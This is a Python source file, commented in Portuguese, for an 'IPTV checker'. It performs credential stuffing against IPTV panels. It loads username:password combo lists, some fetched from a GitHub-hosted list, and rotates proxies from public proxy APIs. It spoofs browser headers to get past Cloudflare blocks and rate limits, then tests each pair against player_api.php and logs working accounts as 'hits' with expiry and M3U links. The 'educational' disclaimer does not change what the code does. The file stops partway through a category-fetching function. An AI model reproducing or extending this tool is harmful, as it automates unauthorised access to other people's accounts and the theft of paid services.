#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DEEPSEEK IPTV CHECKER VERSION - 6 REV - 5
ESSA SCRIPT NÃO FUNCIONA SEM OS SUBS 
ARQUIVOS DENTRO DA PASTA DS ULTRA V6 !
PY CONFIG BY Thomas R., Telegram: @ReyFxck
FEITO PARA AJUDAR QUEM PRECISA E DE GRAÇA!
GITHUB: https://github.com/ReyFxck/DeepSeek-IPTV-Checker
FERRAMENTA EDUCACIONAL NÃO USE PARA O MAL
PROIBIDO A VENDA DESTE SCRIPT!

⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⡿⠿⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⠉⠉⠉⠙⠻⣅⠀⠈⢧⠀⠈⠛⠉⠉⢻⣿⣿
⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣤⡶⠟⠀⠀⣈⠓⢤⣶⡶⠿⠛⠻⣿
⣿⣿⣿⣿⣿⢣⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣀⣴⠶⠿⠿⢷⡄⠀⠀⢀⣤⣾⣿
⣿⣿⣿⣿⣡⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣦⣤⣤⡀⠀⢷⡀⠀⠀⣻⣿⣿
⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⠛⠶⠛⠃⠈⠈⢿⣿⣿
⣿⣿⠟⠘⠀⠀⠀⠀⠀⠀⠀⠀⢀⡆⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠈⣿⣿
⣿⠏⠀⠁⠀⠀⠀⠀⠀⠀⠀⢀⣶⡄⠀⠀⠀⠀⠀⠀⣡⣄⣿⡆⠀⠀⠀⠀⣿⣿
⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⠛⠛⢛⣲⣶⣿⣷⣉⠉⢉⣥⡄⠀⠀⠀⠨⣿⣿
⡇⢠⡆⠀⠀⢰⠀⠀⠀⠀⢸⣿⣧⣠⣿⣿⣿⣿⣿⣿⣷⣾⣿⡅⠀⠀⡄⠠⢸⣿
⣧⠸⣇⠀⠀⠘⣤⡀⠀⠀⠘⣿⣿⣿⣿⣿⠟⠛⠻⣿⣿⣿⡿⢁⠀⠀⢰⠀⢸⣿
⣿⣷⣽⣦⠀⠀⠙⢷⡀⠀⠀⠙⠻⠿⢿⣷⣾⣿⣶⠾⢟⣥⣾⣿⣧⠀⠂⢀⣿⣿
⣿⣿⣿⣿⣷⣆⣠⣤⣤⣤⣀⣀⡀⠀⠒⢻⣶⣾⣿⣿⣿⣿⣿⣿⣿⢀⣀⣾⣿⣿

C o d e d - B y - T h o m a s - N o o b S o f r e !
"""

import os
import sys
import json
import time
import random
import threading
import traceback
from datetime import datetime
from Utils.translate import criar_t, selecionar_idioma, listar_idiomas_disponiveis

class cor:
    white_n = "\033[0;1m"
    vermelho = "\033[91m"
    verde = "\033[92m"
    amarelo = "\033[93m"
    azul = "\033[94m"
    magenta = "\033[95m"
    ciano = "\033[96m"
    reset = "\033[0m"
    c_azul = "\033[38;5;27m"
    c_purple = "\033[38;5;200m"
    custom = "\033[38;5;208m"
    fail = "\033[1;38;5;9m"
    atention = "\033[1;38;5;227m"

try:
    import requests
except ImportError:
    print("{}A biblioteca 'requests' não está instalada. Instale-a com o comando abaixo:{}".format(cor.vermelho, cor.reset))
    print("pip install requests")
    exit()

try:
    import socks
    from requests.packages.urllib3.contrib.socks import SOCKSProxyManager
except ImportError:
    print("{}A biblioteca 'requests[socks]' não está instalada. Instale-a com o comando abaixo:{}".format(cor.vermelho, cor.reset))
    print("pip install requests[socks]")
    exit()

try:
    from tabulate import tabulate
except ImportError:
    print("{}A biblioteca 'tabulate' não está instalada. Instale-a com o comando abaixo:{}".format(cor.vermelho, cor.reset))
    print("pip install tabulate")
    exit()

CONFIG_FILE = "config.json"
PROXY_API_FILE = "proxy_api.json"
COMBO_API_FILE = "combo_api.json"

def carregar_proxy_apis():
    """Carrega as APIs de proxy do arquivo JSON ou retorna padrões."""
    defaults = {
        "ProxyScrape": {
            "url": "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "type": 1
        }
    }
    
    if os.path.exists(PROXY_API_FILE):
        try:
            with open(PROXY_API_FILE, "r") as f:
                return json.load(f)
        except:
            return defaults
    return defaults

PROXY_APIS = carregar_proxy_apis()

def carregar_combo_apis():
    """Carrega as APIs de combo do arquivo JSON"""
    combo_api_file = "combo_api.json"
    defaults = {
        "NORMALIA": {
            "url": "https://raw.githubusercontent.com/ReyFxck/DeepSeek-IPTV-Checker/refs/heads/main/Online-Combos/DwkekaDJ-NORMALIA.txt",
            "display_name": "NORMALIA [BY Dwkeka DJ - 9957 Lines]"
        }
    }
    
    if os.path.exists(combo_api_file):
        try:
            with open(combo_api_file, "r") as f:
                return json.load(f)
        except:
            return defaults
    return defaults

COMBO_APIS = carregar_combo_apis()

def clear():
    """Limpa a tela do terminal."""
    os.system('cls' if os.name == 'nt' else 'clear')


def carregar_configuracoes():
    """Carrega as configurações do arquivo JSON ou cria com valores padrão."""
    defaults = {
        "sistema_operacional": None,
        "idioma": None,
        "configurado": False,
        "banner_color": "90m",
        "hit_settings": {
            "HOST": True,
            "USER": True,
            "PASS": True,
            "STATUS": True,
            "TRIAL": True,
            "EXPIRATION": True,
            "CREATED_AT": True,
            "CONNECTIONS": True,
            "TIMEZONE": True,
            "MESSAGE": True,
            "M3U_LINK": True
        },
        "request_timeout": 10,
        "tentativas_sem_proxy": 2,
        "tentativas_com_proxy": 3,
        "timeout_sem_proxy": 10,
        "timeout_com_proxy": 15,
        "pausar_queda_internet": False,
        "pausar_429": {
            "ativo": False,
            "tempo": 60
        },
        "pausar_403": True,
        "category_settings": {
            "layout_style": "empilhado",
            "use_type_headers": True,
            "join_separator": " • ",
            "show_count_in_list": False,
            "enumerate_categories": True,
            "use_type_separators": True
        }
    }
    
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                dados = json.load(f)

                if isinstance(dados.get("sistema_operacional"), dict):
                    config = {
                        "sistema_operacional": dados["sistema_operacional"].get("sistema_operacional"),
                        "idioma": dados["sistema_operacional"].get("idioma", "pt"),
                        "configurado": dados["sistema_operacional"].get("configurado", False),
                        "banner_color": dados.get("banner_color", "90m"),
                        "hit_settings": {**defaults["hit_settings"], **dados.get("hit_settings", {})},
                        "request_timeout": dados.get("request_timeout", defaults["request_timeout"]),
                        "tentativas_sem_proxy": dados.get("tentativas_sem_proxy", defaults["tentativas_sem_proxy"]),
                        "tentativas_com_proxy": dados.get("tentativas_com_proxy", defaults["tentativas_com_proxy"]),
                        "timeout_sem_proxy": dados.get("timeout_sem_proxy", defaults["timeout_sem_proxy"]),
                        "timeout_com_proxy": dados.get("timeout_com_proxy", defaults["timeout_com_proxy"]),
                        "pausar_queda_internet": dados.get("pausar_queda_internet", defaults["pausar_queda_internet"]),
                        "pausar_429": dados.get("pausar_429", defaults["pausar_429"]),
                        "pausar_403": dados.get("pausar_403", defaults["pausar_403"])
                    }
                else:
                    config = {**defaults, **dados}

                config["hit_settings"] = {**defaults["hit_settings"], **dados.get("hit_settings", {})}

                config["category_settings"] = {**defaults["category_settings"], **config.get("category_settings", {})}

                if "banner_color" not in config:
                    config["banner_color"] = "90m"
                if "request_timeout" not in config:
                    config["request_timeout"] = defaults["request_timeout"]
                if "tentativas_sem_proxy" not in config:
                    config["tentativas_sem_proxy"] = defaults["tentativas_sem_proxy"]
                if "tentativas_com_proxy" not in config:
                    config["tentativas_com_proxy"] = defaults["tentativas_com_proxy"]
                if "timeout_sem_proxy" not in config:
                    config["timeout_sem_proxy"] = defaults["timeout_sem_proxy"]
                if "timeout_com_proxy" not in config:
                    config["timeout_com_proxy"] = defaults["timeout_com_proxy"]
                if "pausar_queda_internet" not in config:
                    config["pausar_queda_internet"] = defaults["pausar_queda_internet"]
                if "pausar_429" not in config:
                    config["pausar_429"] = defaults["pausar_429"]
                if "pausar_403" not in config:
                    config["pausar_403"] = defaults["pausar_403"]

                migrou_configuracoes = False

                if "categoria_tipo" in config and "layout_style" not in config.get("category_settings", {}):
                    config["category_settings"]["layout_style"] = config["categoria_tipo"]
                    migrou_configuracoes = True

                if "usar_separadores_categoria" in config and "use_type_headers" not in config.get("category_settings", {}):
                    config["category_settings"]["use_type_headers"] = config["usar_separadores_categoria"]
                    migrou_configuracoes = True

                if migrou_configuracoes:
                    config.pop("categoria_tipo", None)
                    config.pop("usar_separadores_categoria", None)

                    with open(CONFIG_FILE, "w") as f:
                        json.dump(config, f, indent=4)
                    print("{}[INFO] Configurações de categoria migradas com sucesso!{}".format(cor.verde, cor.reset))

                if "separator_style" in config.get("category_settings", {}):
                    del config["category_settings"]["separator_style"]
                if "show_category_count" in config.get("category_settings", {}):
                    config["category_settings"]["show_count_in_list"] = config["category_settings"].pop("show_category_count")

                return config
        except Exception as e:
            print("{}Erro ao carregar configurações: {}{}".format(cor.vermelho, e, cor.reset))
            return defaults
    return defaults


def salvar_configuracao(config):
    """Salva as configurações atuais no arquivo JSON."""
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)


def banner(config, t):
    """Exibe o banner do script no terminal."""
    clear()
    translated_by = t('traduce.traduce_json', default="Json não carregado")
    print("""{}
        ⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣤⣶⣶⣶⠶⠀⠀⠀⠀⣰⣿⣄            
        ⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⣿⣿⣿⣷⣦⡀⢀⣀⣀⣠⣴⣿          
        ⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⢹⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⡿         
        ⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁        
        ⣾⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⣿⣿⣿⣿⡟⠛⠉⠁        
        ⣿⣿⡇⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣏⣉⠻⢿⣿⣿⣿⣿⣿⣿⣿⡇        
        ⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣯⣿⡇⠀⢻⣿⣿⣿⣿⣿⣿⠁        
        ⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣷⣦⣴⣿⣿⣿⣿⣿⠏        
        ⢻⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟        
        ⠀⠹⣿⣿⣿⣷⣄⠀⠀⠀⠀⣴⣦⣄⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⠋        
        ⠀⠀⠙⢿⣿⣿⣿⣷⣄⡀⠀⢿⣿⣿⣿⣦⣄⠀⠙⢿⣿⣿⣿⣿⣿⣤⣀        
        ⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣽⡿⢿⣿⣿⣿⣿⡿        
        ⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀{}
{}\n            DEEPSEEK IPTV CHECKER BY @ReyFxck
            GitHub https://github.com/ReyFxck
            Script Python, Version: 6 Rev: 05\n{}
            Translated by: {}{}""".format(cor.c_azul, cor.reset, cor.c_purple, cor.reset, translated_by, cor.reset))


def configurar_hit_settings(config, t):
    """Menu para configurar o que aparece no arquivo de hits"""
    while True:
        banner(config, t)
        print("\n{}  === CONFIGURAR INFORMAÇÕES NO HIT ==={}".format(cor.ciano, cor.reset))
        print("{}  Selecione o item para ativar/desativar:{}\n".format(cor.amarelo, cor.reset))

        settings = config["hit_settings"]
        for i, (key, value) in enumerate(settings.items(), 1):
            status = f"{cor.verde}ON{cor.reset}" if value else f"{cor.vermelho}OFF{cor.reset}"
            print("{}  {}. {}: [{}".format(cor.azul, i, key.ljust(12), status))
        
        print("\n{}  {}. Voltar{}".format(cor.ciano, len(settings)+1, cor.reset))
        print("{}{}{}  \n".format(cor.ciano, "=" * 26, cor.reset))
        
        try:
            escolha = int(input("{}  {} >>> {}".format(
                cor.verde,
                t('responses.response'),
                cor.reset
            ))) - 1
            if escolha == len(settings):
                return
            elif 0 <= escolha < len(settings):
                key = list(settings.keys())[escolha]

                print("\n{}  {} | DESEJA LIGAR/DESLIGAR?{}".format(cor.ciano, key, cor.reset))
                print("{}  [1] LIGADO{}".format(cor.azul, cor.reset))
                print("{}  [2] DESLIGADO{}".format(cor.azul, cor.reset))
                opcao = input("{}  {} >>> {}".format(
                    cor.verde,
                    t('responses.response'),
                    cor.reset
                )).strip()
                if opcao == "1":
                    settings[key] = True
                elif opcao == "2":
                    settings[key] = False
                salvar_configuracao(config)
        except ValueError:
            print("{}Opção inválida!{}".format(cor.vermelho, cor.reset))

def escolher_sistema_operacional(config, t=None):
    """Permite ao usuário escolher o sistema operacional e define o caminho base para as pastas de saída."""
    banner(config, t)

    SISTEMAS_PADRONIZADOS = {
        "1": "Android",
        "2": "Windows", 
        "3": "Linux",
        "4": "macOS",
        "5": "iOS"
    }

    if t:
        titulo = ('  Escolha o sistema operacional:')
        ajuda = ('Isso define onde as pastas serão criadas:')
        opcoes_texto = {
            "1": ("Android"),
            "2": ("Windows"),
            "3": ("Linux"), 
            "4": ("macOS"),
            "5": ("iOS")
        }
        prompt = ('>>')
        erro_msg = ('Opção inválida!')
        confirmacao = ('Caminho que será usado:')
    else:
        titulo = "Escolha o sistema operacional:"
        ajuda = "Isso define onde as pastas serão criadas:"
        opcoes_texto = SISTEMAS_PADRONIZADOS.copy()
        prompt = ">>>"
        erro_msg = "Opção inválida!"
        confirmacao = "Caminho que será usado:"

    print("{}{}{}".format(cor.ciano, titulo, cor.reset))
    print("\n{}[?] {}{}".format(cor.amarelo, ajuda, cor.reset))

    for num, nome in opcoes_texto.items():
        print("{}{}. {}{}".format(cor.azul, num, nome, cor.reset))

    while True:
        escolha = input("{}  {} >>> {}".format(
            cor.verde,
            t('responses.response'),
            cor.reset
        )).strip()
        
        if escolha in SISTEMAS_PADRONIZADOS:
            sistema_escolhido = SISTEMAS_PADRONIZADOS[escolha]
            caminho = determinar_caminho_base(sistema_escolhido)

            print("\n{}✓ {}{}".format(cor.verde, confirmacao, cor.reset))
            print("{}{}{}".format(cor.ciano, caminho if caminho else 'Não suportado!', cor.reset))
            
            if caminho:
                return sistema_escolhido
            else:
                print("{}Sistema não suportado! Escolha novamente.{}".format(cor.vermelho, cor.reset))
        else:
            print("{}{}{}".format(cor.vermelho, erro_msg, cor.reset))

def determinar_caminho_base(sistema_operacional):
    try:
        caminhos = {
            "Android": "/sdcard/",
            "Windows": os.path.join(os.environ["USERPROFILE"], "Documents"),
            "Linux": os.path.join(os.environ.get("HOME", "/"), "Documents"),
            "macOS": os.path.join(os.environ.get("HOME", "/"), "Documents"),
            "iOS": "."
        }
        return caminhos.get(sistema_operacional, None)
    except KeyError:

        return "/sdcard/" if sistema_operacional == "Android" else None

def limpar_host(host):
    host = host.replace("http://", "").replace("https://", "")
    host = host.split("/")[0]
    host = host.strip()
    return host


def escolher_combo_api(config, t):
    """Mostra menu de APIs de combo e retorna lista de combos"""
    banner(config, t)
    print("\n{}  === ONLINE COMBO API'S ==={}".format(cor.ciano, cor.reset))
    print("{}  Selecione a fonte de combos online:{}\n".format(cor.atention, cor.reset))
    
    for i, (nome, dados) in enumerate(COMBO_APIS.items(), 1):
        display = dados.get("display_name", nome)
        print("{}  {}. {}{}".format(cor.azul, i, display, cor.reset))
    
    print("\n{}  {}. Voltar{}".format(cor.ciano, len(COMBO_APIS)+1, cor.reset))
    print("{}{}{}  \n".format(cor.ciano, "=" * 26, cor.reset))
    
    try:
        escolha = int(input("{}  {} >>> {}".format(
            cor.verde,
            t('responses.response'),
            cor.reset
        ))) - 1
        if escolha == len(COMBO_APIS):
            return None
        
        if 0 <= escolha < len(COMBO_APIS):
            nome_api = list(COMBO_APIS.keys())[escolha]
            api = COMBO_APIS[nome_api]
            
            print("\n{}  Obtendo combos de {}...{}".format(cor.verde, api.get("display_name", nome_api), cor.reset))
            
            try:

                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'DNT': '1',
                    'Connection': 'keep-alive',
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'Cache-Control': 'max-age=0'
                }

                headers.update(api.get("headers", {}))

                tentativas = config.get("tentativas_sem_proxy", 2)
                timeout = config.get("timeout_sem_proxy", 10)
                
                for tentativa in range(tentativas):
                    try:

                        if tentativa > 0:
                            time.sleep(random.uniform(2, 5))

                        response = requests.get(api["url"], headers=headers, timeout=timeout, allow_redirects=True)
                        
                        if response.status_code == 200:

                            linhas = response.text.strip().split('\n')
                            combos = []
                            for linha in linhas:
                                linha = linha.strip()
                                if ":" in linha and len(linha.split(":")) >= 2:
                                    parts = linha.split(":", 1)
                                    combos.append((parts[0], parts[1]))
                            
                            if combos:
                                print("{}  {} combos obtidos com sucesso!{}".format(cor.verde, len(combos), cor.reset))
                                return combos
                            else:

                                try:
                                    data = response.json()
                                    combos = []
                                    
                                    if isinstance(data, list):
                                        for item in data:
                                            if isinstance(item, dict) and 'user' in item and 'pass' in item:
                                                combos.append((item['user'], item['pass']))
                                            elif isinstance(item, str) and ':' in item:
                                                parts = item.split(':', 1)
                                                if len(parts) == 2:
                                                    combos.append((parts[0], parts[1]))
                                    elif isinstance(data, dict):
                                        for key, value in data.items():
                                            if isinstance(value, list):
                                                for item in value:
                                                    if isinstance(item, dict) and 'user' in item and 'pass' in item:
                                                        combos.append((item['user'], item['pass']))
                                                    elif isinstance(item, str) and ':' in item:
                                                        parts = item.split(':', 1)
                                                        if len(parts) == 2:
                                                            combos.append((parts[0], parts[1]))
                                    
                                    if combos:
                                        print("{}  {} combos obtidos com sucesso!{}".format(cor.verde, len(combos), cor.reset))
                                        return combos
                                except json.JSONDecodeError:
                                    pass
                                    
                        elif response.status_code == 403:
                            print("{}  Erro 403: Cloudflare bloqueou o acesso (tentativa {}/{}){}".format(cor.vermelho, tentativa + 1, tentativas, cor.reset))
                        elif response.status_code == 429:
                            print("{}  Rate limit (429): Aguardando antes da próxima tentativa...{}".format(cor.amarelo, cor.reset))
                            time.sleep(10)
                        else:
                            print("{}  Erro HTTP {} (tentativa {}/{}){}".format(cor.vermelho, response.status_code, tentativa + 1, tentativas, cor.reset))
                            
                    except requests.exceptions.Timeout:
                        print("{}Timeout ao carregar combo da API (tentativa {}/{}){}".format(cor.vermelho, tentativa + 1, tentativas, cor.reset))
                    except requests.exceptions.ConnectionError:
                        print("{}Erro de conexão ao carregar combo da API (tentativa {}/{}){}".format(cor.vermelho, tentativa + 1, tentativas, cor.reset))
                    except Exception as e:
                        print("{}Erro ao carregar combo da API: {} (tentativa {}/{}){}".format(cor.vermelho, e, tentativa + 1, tentativas, cor.reset))

                    if tentativa < tentativas - 1:
                        time.sleep(random.uniform(3, 8))
                
                print("{}  Falha ao obter combos após {} tentativas{}".format(cor.vermelho, tentativas, cor.reset))
                return None
                
            except Exception as e:
                print("{}  Erro ao acessar API: {}{}".format(cor.vermelho, str(e), cor.reset))
                return None
    except ValueError:
        print("{}  Opção inválida!{}".format(cor.vermelho, cor.reset))
        return None


def escolher_proxy_api(config, t):
    """Mostra menu de APIs de proxy e retorna (proxies, tipo_proxy)"""
    banner(config, t)
    print("\n{}  === ONLINE PROXY API'S ==={}".format(cor.ciano, cor.reset))
    print("{}  Selecione a fonte de proxies online:{}\n".format(cor.atention, cor.reset))
    
    for i, (nome, dados) in enumerate(PROXY_APIS.items(), 1):

        display = dados.get('display_name', 
                          f"{nome.split()[0]} ({'HTTP' if dados['type'] == 1 else 'SOCKS4' if dados['type'] == 2 else 'SOCKS5'})")
        print("{}  {}. {}{}".format(cor.azul, i, display, cor.reset))
    
    print("\n{}  {}. Voltar{}".format(cor.ciano, len(PROXY_APIS)+1, cor.reset))
    print("{}{}{}  \n".format(cor.ciano, "=" * 26, cor.reset))
    
    try:
        escolha = int(input("{}  {} >>> {}".format(
            cor.verde,
            t('responses.response'),
            cor.reset
        ))) - 1
        if escolha == len(PROXY_APIS):
            return None
        
        if 0 <= escolha < len(PROXY_APIS):
            nome_api = list(PROXY_APIS.keys())[escolha]
            api = PROXY_APIS[nome_api]
            
            print("\n{}  Obtendo proxies de {}...{}".format(cor.verde, api.get("display_name", nome_api), cor.reset))

            tentativas = config.get("tentativas_sem_proxy", 2)
            timeout = config.get("timeout_sem_proxy", 10)

            for tentativa in range(tentativas):
                try:
                    headers = api.get("headers", {})
                    response = requests.get(api["url"], headers=headers, timeout=timeout)
                    
                    if response.status_code == 200:
                        proxies = [p.strip() for p in response.text.splitlines() if p.strip()]
                        
                        if api.get("clean_protocol", False):
                            proxies = [p.replace("http://", "").replace("socks4://", "").replace("socks5://", "") for p in proxies]
                        
                        if proxies:
                            print("{}  {} proxies obtidos com sucesso!{}".format(cor.verde, len(proxies), cor.reset))
                            return proxies, api["type"]
                        else:
                            print("{}  Nenhum proxy encontrado na API (tentativa {}/{}){}".format(cor.amarelo, tentativa + 1, tentativas, cor.reset))
                    elif response.status_code == 403:
                        print("{}  Erro 403: Cloudflare bloqueou o acesso ao proxy (tentativa {}/{}){}".format(cor.vermelho, tentativa + 1, tentativas, cor.reset))
                    elif response.status_code == 429:
                        print("{}  Rate limit (429) para proxy: Aguardando antes da próxima tentativa...{}".format(cor.amarelo, cor.reset))
                        time.sleep(10)
                    else:
                        print("{}  Erro HTTP {} ao acessar proxy (tentativa {}/{}){}".format(cor.vermelho, response.status_code, tentativa + 1, tentativas, cor.reset))
                        
                except requests.exceptions.Timeout:
                    print("{}Timeout ao carregar proxy da API (tentativa {}/{}){}".format(cor.vermelho, tentativa + 1, tentativas, cor.reset))
                except requests.exceptions.ConnectionError:
                    print("{}Erro de conexão ao carregar proxy da API (tentativa {}/{}){}".format(cor.vermelho, tentativa + 1, tentativas, cor.reset))
                except Exception as e:
                    print("{}Erro ao carregar proxy da API: {} (tentativa {}/{}){}".format(cor.vermelho, e, tentativa + 1, tentativas, cor.reset))
                
                if tentativa < tentativas - 1:
                    time.sleep(random.uniform(3, 8))
            
            print("{}  Falha ao obter proxies após {} tentativas{}".format(cor.vermelho, tentativas, cor.reset))
            return None
                
    except ValueError:
        print("{}  Opção inválida!{}".format(cor.vermelho, cor.reset))
        return None


def escolher_arquivo(pasta, t, tipo="combo", config=None):
    if not os.path.exists(pasta):
        print("{}  {} {}{}".format(cor.amarelo, t('responses.creating_folder_combo', 'Criando pasta:'), pasta, cor.reset))
        os.makedirs(pasta)
        return None
        
    arquivos = [f for f in os.listdir(pasta) if f.endswith('.txt')]
    
    print("\n  {}{}{}".format(cor.ciano, "=" * 26, cor.reset))
    if tipo == "combo":
        print("{}  {}{}".format(cor.atention, t('questions.select_combo_file'), cor.reset))
    else:
        print("{}  {}{}".format(cor.atention, t('questions.select_proxy_file'), cor.reset))
    
    if tipo == "combo":
        print("{}  [0] ONLINE COMBO API'S{}".format(cor.magenta, cor.reset))

    elif tipo != "combo":
         print("{}  [0] ONLINE PROXY API'S{}".format(cor.magenta, cor.reset))
    
    for i, arquivo in enumerate(arquivos, 1):
        print("{}  {}. {}{}".format(cor.azul, i, arquivo, cor.reset))
        
    print("  {}{}{}\n".format(cor.ciano, "=" * 26, cor.reset))
    
    try:
        escolha = input("\n  {}{} >>> {}".format(
            cor.verde,
            t('responses.response'),
            cor.reset
        )).strip()

        if escolha == "0" and tipo == "combo":
            return escolher_combo_api(config, t)

        elif escolha == "0" and tipo != "combo":
            return escolher_proxy_api(config, t)
            
        escolha = int(escolha) - 1
        if 0 <= escolha < len(arquivos):
            return os.path.join(pasta, arquivos[escolha])
        else:
            print("{}\n  {}{}".format(cor.vermelho, t('responses.invalid_choice'), cor.reset))
            return None
    except ValueError:
        print("{}\n  {}{}".format(cor.vermelho, t('responses.invalid_input'), cor.reset))
        return None


def configurar_proxy(tipo, proxy, formato_paga=None):
    """Formata proxy com base no tipo e no formato de autenticação"""
    try:
        if formato_paga == "1":
            host, port, user, pwd = proxy.split(":")
            proxy_auth = f"{user}:{pwd}@{host}:{port}"
        elif formato_paga == "2":
            proxy_auth = proxy
        elif formato_paga == "3":
            proxy_auth = proxy.replace("http://", "")
        else:
            proxy_auth = proxy

        if tipo == 1:
            return {
                "http": f"http://{proxy_auth}",
                "https": f"http://{proxy_auth}"
            }
        elif tipo == 2:
            if not proxy_auth.startswith("socks4://"):
                proxy_auth = f"socks4://{proxy_auth}"
            return {
                "http": proxy_auth,
                "https": proxy_auth
            }
        elif tipo == 3:
            if not proxy_auth.startswith("socks5://"):
                proxy_auth = f"socks5://{proxy_auth}"
            return {
                "http": proxy_auth,
                "https": proxy_auth
            }
        else:
            return None
    except Exception as e:
        print("{}[ERRO CONFIG PROXY] {}{}".format(cor.vermelho, e, cor.reset))
        return None

def converter_data(timestamp, t=None):
    try:
        return datetime.fromtimestamp(int(timestamp)).strftime('%d.%m.%Y - %H:%M')
    except:
        return t('checker.unlimited_time') if t else "Ilimitada"

def test_account(username, password, proxy_config, server, headers, t, escolha_categoria="1", config=None):
    """
    Retorna uma tupla no formato:
    (tipo_resultado, username, password, status, exp_date, status_code, user_info)

    - tipo_resultado: "hit", "bad", "ban", "timeout", "proxy_error"
    """
    url = f"http://{server}/player_api.php?username={username}&password={password}"
    tentativas = config.get("tentativas_com_proxy", 3) if proxy_config else config.get("tentativas_sem_proxy", 2)
    timeout = config.get("timeout_com_proxy", 15) if proxy_config else config.get("timeout_sem_proxy", 10)
    proxies = proxy_config if proxy_config else None

    for tentativa in range(tentativas):
        try:
            response = requests.get(url, proxies=proxies, headers=headers, timeout=timeout)

            if response.status_code == 429:
                if config.get("pausar_429", {}).get("ativo"):
                    tempo = config.get("pausar_429", {}).get("tempo", 60)
                    print("{}[429] Pausando por {} segundos...{}".format(cor.amarelo, tempo, cor.reset))
                    time.sleep(tempo)
                return "ban", username, password, None, None, response.status_code, None

            if response.status_code in [403, 407]:
                return "ban", username, password, None, None, response.status_code, None

            if response.status_code == 200:
                try:
                    data = response.json()
                    auth = data.get("user_info", {}).get("auth", 0)
                    if auth == 0:
                        auth = data.get("auth", 0)

                    if auth == 1:
                        user_info = data.get("user_info", {})
                        status = user_info.get("status", data.get("status", "Desconhecido"))
                        exp_date = user_info.get("exp_date", data.get("exp_date"))
                        exp_date = t("checker.unlimited_time") if exp_date is None else converter_data(exp_date, t)

                        if escolha_categoria != "1":
                            user_info["categorias"] = buscar_categorias(
                                server, username, password, proxy_config, headers, config, escolha_categoria
                            )

                        return (
                            "hit",
                            username,
                            password,
                            status,
                            exp_date,
                            response.status_code,
                            user_info
                        )
                    else:
                        return (
                            "bad",
                            username,
                            password,
                            None,
                            None,
                            response.status_code,
                            None
                        )
                except (ValueError, json.JSONDecodeError):
                    return (
                        "bad",
                        username,
                        password,
                        None,
                        None,
                        response.status_code,
                        None
                    )

            return "bad", username, password, None, None, response.status_code, None

        except requests.exceptions.Timeout:
            continue

        except requests.exceptions.ProxyError as e:
            print("{}[DEBUG PROXY ERROR] {}{}".format(cor.vermelho, e, cor.reset))
            return "proxy_error", username, password, None, None, "Proxy Error", None

        except requests.exceptions.ConnectionError as e:
            if config.get("pausar_queda_internet", False):
                print("{}[Sem conexão] Pausando e tentando reconectar...{}".format(cor.amarelo, cor.reset))
                while True:
                    try:
                        requests.get("http://clients3.google.com/generate_204", timeout=5)
                        print("{}[Conexão recuperada!]{}".format(cor.verde, cor.reset))
                        break
                    except:
                        time.sleep(2)
            else:
                print("{}[DEBUG CONNECTION ERROR] {}{}".format(cor.vermelho, e, cor.reset))
                return "connection_error", username, password, None, None, "Connection Error", None

        except requests.exceptions.RequestException:
            return "proxy_error", username, password, None, None, "Request Error", None

    return "timeout", username, password, None, None, "Max tentativas", None


def buscar_categorias(server, username, password, proxy_config, headers, config, escolha):
    """
    Busca categorias com base na escolha do usuário, suportando múltiplos formatos de resposta da API.
    """
    categorias_encontradas = {}

    mapa_escolha = {
        "2": ["live", "vod", "series"],
        "3": ["live", "vod"],  
        "4": ["vod", "series"],
        "5": ["live"],
        "6": ["vod"],
        "7": ["series"],
        "8": ["live", "series"]
    }
    
    tipos_a_buscar = mapa_escolha.get(escolha, [])

